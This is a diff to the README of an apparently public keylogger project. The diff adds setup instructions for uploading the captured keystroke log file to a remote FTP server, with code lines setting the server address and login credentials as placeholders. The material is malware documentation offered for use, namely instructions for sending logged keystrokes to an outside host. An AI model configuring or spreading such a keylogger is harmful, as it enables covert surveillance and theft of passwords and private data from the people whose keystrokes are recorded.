@@ -26,7 +26,17 @@ $ git clone https://github.com/Advaidv121/Keylogger && cd Keylogger
 Next, install Keylogger using pip3 with the following instructions:
 
 ```
-pip install -r requirements.txt
+$ pip install -r requirements.txt
+```
+## Pre Execution ⏮️
+
+On line number **36** add the necessary ftp address for the log file to be uploaded into the ftp server
+```
+36 ftp=FTP('xx.xxx.xx.xx') #replace 'xx.xxx.xx.xx'
+```
+On line number **37** add the necessary username and password to login into the ftp server for upload
+```
+37 ftp.login('username','password')  #replace 'username' 'password'
 ```
 
 ## Execution 🏃‍♂️
